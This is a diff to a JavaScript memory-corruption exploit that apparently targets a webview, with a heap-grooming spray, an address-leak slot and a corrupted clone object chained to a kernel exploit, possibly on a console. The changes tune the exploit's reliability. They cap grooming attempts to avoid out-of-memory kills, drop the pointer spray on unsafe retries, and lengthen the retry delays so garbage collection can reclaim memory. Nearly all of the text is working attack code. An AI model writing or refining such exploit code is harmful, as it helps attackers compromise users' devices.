@@ -10,7 +10,13 @@ const LEAK_SLOT_OFFSET = 0x20;
 // Bound the heap-groom retry loop. Each attempt allocates 512 x 0x10000
 // (32 MiB of requested backing storage); without a cap the page can spin
 // forever and starve the console instead of failing cleanly.
-const MAX_ATTEMPTS = 8;
+// Each attempt grooms ~40 MiB of heap (512 x 64 KiB keepAlive spray plus the
+// slab and holes). Eight attempts meant up to ~320 MiB of transient allocations
+// on top of an already-heavy webview, which is what produced the "not enough
+// system memory" warning and the OS killing the process while the kernel chain
+// was armed. Four attempts still covers the realistic placement misses but caps
+// peak pressure at roughly half.
+const MAX_ATTEMPTS = 4;
 
 const symbolToString = Symbol.prototype.toString;
 const viewHeader = new Uint8Array(CELL_BYTES);
@@ -183,11 +189,30 @@ function retry(reason, safeToRelease) {
     return;
   }
   emit("Retry", `${reason} attempt ${nextAttempt}`);
-  if (safeToRelease) releaseAttempt();
+  if (safeToRelease) {
+    releaseAttempt();
+  } else {
+    // Unsafe to drop keepAlive: the corrupted clone may still reference those
+    // buffers, and freeing them would leave dangling pointers in the heap we
+    // are about to groom again. But the pointer spray and the big cached
+    // references are dead weight -- the next attempt rebuilds them from
+    // scratch -- so drop them to relieve pressure without touching the buffers.
+    try {
+      clearPointerSpray();
+    } catch {}
+    try {
+      dropAttemptReferences();
+    } catch {}
+  }
+  // Give the engine time to collect before allocating ~40 MiB again. The 50 ms
+  // retry fired faster than GC could run, so a failing attempt could stack its
+  // 32 MiB spray on top of the previous one -- the exact memory spike that
+  // tripped the "not enough system memory" warning and got the process killed
+  // mid-chain. The longer delay lets the old generation actually be reclaimed.
   setTimeout(() => {
     attemptNumber = nextAttempt;
     startAttempt();
-  }, safeToRelease ? 750 : 50);
+  }, safeToRelease ? 900 : 1200);
 }
 
 function finishEarlySafeAttempt(reason, detail = "") {
